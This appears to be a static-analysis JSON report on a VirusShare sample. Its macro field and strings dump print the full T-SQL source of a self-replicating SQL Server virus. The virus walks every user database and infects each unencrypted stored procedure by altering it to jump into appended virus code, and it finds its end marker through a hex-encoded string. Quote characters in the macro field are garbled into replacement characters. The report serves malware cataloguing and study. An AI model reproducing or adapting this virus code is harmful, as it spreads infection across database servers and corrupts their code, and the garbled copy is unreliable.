{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "OPEN": "May open a file",
            "exec": "May run an executable file or a system command using Excel 4 Macros"
        },
        "macro": "SET QUOTED_IDENTIFIER OFF \nGO\nSET ANSI_NULLS OFF \nGO\nCREATE PROCEDURE Virus2\nAS\nDECLARE @sp varchar(128), @current_db VARCHAR(128), @current_proc varchar(255),@current_text varchar(8000),@cmd varchar(8000), @a int, @b int, @VirusCode varchar(8000),@Vsize int\n--get Virus code\nset @VirusCode=(SELECT c.text FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE o.type=\ufffd\ufffdp\ufffd\ufffd and (o.category=0) and (o.id = @@Procid))\nset @a=CHARINDEX(\ufffd\ufffdVirus:\ufffd\ufffd,@VirusCode)\nset @b=CHARINDEX(convert(varchar(20),0x474F544F205669727573446F6E65),@VirusCode)\nset @VirusCode=SUBSTRING(@VirusCode, @a-10, @b-@a+25)\nSET @Vsize=datalength(@VirusCode)\n\nDECLARE CursorDB CURSOR FOR \nSELECT NAME FROM master..SYSDATABASES where sid<>1\nOPEN CursorDB\nFETCH NEXT FROM CursorDB INTO @current_db\nWHILE @@FETCH_STATUS=0\nBEGIN \nprint \ufffd\ufffdDatabase: \ufffd\ufffd+@current_db\ncreate table #temp (c varchar(8000))\ninsert #temp\nexec(\ufffd\ufffdSELECT c.text FROM \ufffd\ufffd+@current_db+\ufffd\ufffd..sysobjects o INNER JOIN \ufffd\ufffd+@current_db+\ufffd\ufffd..syscomments c ON c.id = o.id \nWHERE o.type=\ufffd\ufffd\ufffd\ufffdp\ufffd\ufffd\ufffd\ufffd and o.category=0 and encrypted=0 and left(c.text,22)<>\ufffd\ufffd\ufffd\ufffdCREATE PROCEDURE Virus\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd)\nDECLARE _Cursor CURSOR FOR \nselect * from #temp\nOPEN _Cursor\nFETCH NEXT FROM _Cursor INTO @current_text\nWHILE @@FETCH_STATUS=0\nBEGIN \nset @a=CHARINDEX(\ufffd\ufffdCREATE PROCEDURE\ufffd\ufffd,@current_text)+17\nset @b=CHARINDEX(\ufffd\ufffd \ufffd\ufffd,@current_text,@a)\nset @sp=substring(@current_text,@a,@b-@a)\nprint \ufffd\ufffd*\ufffd\ufffd+@sp+\ufffd\ufffd*\ufffd\ufffd\n--is there room for the virus?\nset @cmd=\ufffd\ufffdSELECT count(name) FROM \ufffd\ufffd+@current_db+\ufffd\ufffd..sysobjects o INNER JOIN \ufffd\ufffd+@current_db+\ufffd\ufffd..syscomments c ON c.id = o.id WHERE name=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd+@sp+\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ncreate table #temp2(i int)\ninsert #temp2\nexec(@cmd)\nset @a=(select * from #temp2)\ndrop table #temp2\nIF @a>1 GOTO IgnoreSP\nIF datalength(@current_text)+@Vsize+23>8000 GOTO IgnoreSP\nIF CHARINDEX(\ufffd\ufffdVirusDone:\ufffd\ufffd,@current_text)>0 GOTO IgnoreSP--is it infected?\n\nSET @cmd =  replace(@current_text, \ufffd\ufffdCREATE PROCEDURE \ufffd\ufffd, \ufffd\ufffdALTER PROCEDURE \ufffd\ufffd)\nset @a=1\ntry2:\nset @a=CHARINDEX(\ufffd\ufffdas\ufffd\ufffd,@cmd,(@a+1))\nIF @a>0 and ascii(SUBSTRING(@cmd,@a-1,1)) NOT IN (32,13,10,9,0) GOTO try2\nIF @a>0 and ascii(SUBSTRING(@cmd,@a+2,1)) NOT IN (32,13,10,9,0) GOTO try2\nset @b=@a\n--avoid --\nwhile (@b>1) and (ascii(SUBSTRING(@cmd,@b,1))<>13) set @b=@b-1\nif CHARINDEX(\ufffd\ufffd--\ufffd\ufffd,SUBSTRING(@cmd,@b,@a-@b))>0  GOTO try2\n--avoid /*\nset @b=@a\nwhile (@b>2) and (SUBSTRING(@cmd,@b,1)<>\ufffd\ufffd*\ufffd\ufffd) and (SUBSTRING(@cmd,@b-1,1)<>\ufffd\ufffd/\ufffd\ufffd) set @b=@b-1\nif (@b<@a)and (CHARINDEX(\ufffd\ufffd*/\ufffd\ufffd,@cmd,@b)>@a)  GOTO try2\nset @cmd=stuff(@cmd, @a+2,1,char(13)+\ufffd\ufffdGOTO Virus\ufffd\ufffd+char(13)+\ufffd\ufffdVirusDone:\ufffd\ufffd+char(13))\n--add virus code to SP\nset @cmd=@cmd+@VirusCode\nSET @cmd =\ufffd\ufffdUSE \ufffd\ufffd+@current_db+\ufffd\ufffd exec(\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd+replace(@cmd,\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd,\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd)+\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd)\ufffd\ufffd\nprint( @cmd)\nIgnoreSP:\n\n\nFETCH NEXT FROM _Cursor INTO @current_text\nEND\nCLOSE _Cursor\nDEALLOCATE _Cursor\ndrop table #temp\nFETCH NEXT FROM CursorDB INTO @current_db\nEND\nCLOSE CursorDB\nDEALLOCATE CursorDB\nGO\nSET QUOTED_IDENTIFIER OFF \nGO\nSET ANSI_NULLS ON \nGO "
    },
    "filename": "VirusShare_0caa6a8b0c56b749692881df16a9a951",
    "filesize": 3013,
    "filetype": "ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "0caa6a8b0c56b749692881df16a9a951",
        "sha1": "f42e45b0a9779d11b9de237f9ce4d290b25e57bd",
        "sha256": "4babddbecd5351fbaba9c33c4954742cf2799b0e1caf4dbfa02967a9197715a5"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "SET QUOTED_IDENTIFIER OFF ",
            "SET ANSI_NULLS OFF ",
            "CREATE PROCEDURE Virus2",
            "DECLARE @sp varchar(128), @current_db VARCHAR(128), @current_proc varchar(255),@current_text varchar(8000),@cmd varchar(8000), @a int, @b int, @VirusCode varchar(8000),@Vsize int",
            "--get Virus code",
            "set @VirusCode=(SELECT c.text FROM sysobjects o INNER JOIN syscomments c ON c.id = o.id WHERE o.type=p and (o.category=0) and (o.id = @@Procid))",
            "set @a=CHARINDEX(Virus:,@VirusCode)",
            "set @b=CHARINDEX(convert(varchar(20),0x474F544F205669727573446F6E65),@VirusCode)",
            "set @VirusCode=SUBSTRING(@VirusCode, @a-10, @b-@a+25)",
            "SET @Vsize=datalength(@VirusCode)",
            "DECLARE CursorDB CURSOR FOR ",
            "SELECT NAME FROM master..SYSDATABASES where sid<>1",
            "OPEN CursorDB",
            "FETCH NEXT FROM CursorDB INTO @current_db",
            "WHILE @@FETCH_STATUS=0",
            "BEGIN ",
            "print Database: +@current_db",
            "create table #temp (c varchar(8000))",
            "insert #temp",
            "exec(SELECT c.text FROM +@current_db+..sysobjects o INNER JOIN +@current_db+..syscomments c ON c.id = o.id ",
            "WHERE o.type=p and o.category=0 and encrypted=0 and left(c.text,22)<>CREATE PROCEDURE Virus)",
            "DECLARE _Cursor CURSOR FOR ",
            "select * from #temp",
            "OPEN _Cursor",
            "FETCH NEXT FROM _Cursor INTO @current_text",
            "WHILE @@FETCH_STATUS=0",
            "BEGIN ",
            "set @a=CHARINDEX(CREATE PROCEDURE,@current_text)+17",
            "set @b=CHARINDEX( ,@current_text,@a)",
            "set @sp=substring(@current_text,@a,@b-@a)",
            "print *+@sp+*",
            "--is there room for the virus?",
            "set @cmd=SELECT count(name) FROM +@current_db+..sysobjects o INNER JOIN +@current_db+..syscomments c ON c.id = o.id WHERE name=+@sp+",
            "create table #temp2(i int)",
            "insert #temp2",
            "exec(@cmd)",
            "set @a=(select * from #temp2)",
            "drop table #temp2",
            "IF @a>1 GOTO IgnoreSP",
            "IF datalength(@current_text)+@Vsize+23>8000 GOTO IgnoreSP",
            "IF CHARINDEX(VirusDone:,@current_text)>0 GOTO IgnoreSP--is it infected?",
            "SET @cmd =  replace(@current_text, CREATE PROCEDURE , ALTER PROCEDURE )",
            "set @a=1",
            "try2:",
            "set @a=CHARINDEX(as,@cmd,(@a+1))",
            "IF @a>0 and ascii(SUBSTRING(@cmd,@a-1,1)) NOT IN (32,13,10,9,0) GOTO try2",
            "IF @a>0 and ascii(SUBSTRING(@cmd,@a+2,1)) NOT IN (32,13,10,9,0) GOTO try2",
            "set @b=@a",
            "--avoid --",
            "while (@b>1) and (ascii(SUBSTRING(@cmd,@b,1))<>13) set @b=@b-1",
            "if CHARINDEX(--,SUBSTRING(@cmd,@b,@a-@b))>0  GOTO try2",
            "--avoid /*",
            "set @b=@a",
            "while (@b>2) and (SUBSTRING(@cmd,@b,1)<>*) and (SUBSTRING(@cmd,@b-1,1)<>/) set @b=@b-1",
            "if (@b<@a)and (CHARINDEX(*/,@cmd,@b)>@a)  GOTO try2",
            "set @cmd=stuff(@cmd, @a+2,1,char(13)+GOTO Virus+char(13)+VirusDone:+char(13))",
            "--add virus code to SP",
            "set @cmd=@cmd+@VirusCode",
            "SET @cmd =USE +@current_db+ exec(+replace(@cmd,,)+)",
            "print( @cmd)",
            "IgnoreSP:",
            "FETCH NEXT FROM _Cursor INTO @current_text",
            "CLOSE _Cursor",
            "DEALLOCATE _Cursor",
            "drop table #temp",
            "FETCH NEXT FROM CursorDB INTO @current_db",
            "CLOSE CursorDB",
            "DEALLOCATE CursorDB",
            "SET QUOTED_IDENTIFIER OFF ",
            "SET ANSI_NULLS ON "
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.308286",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
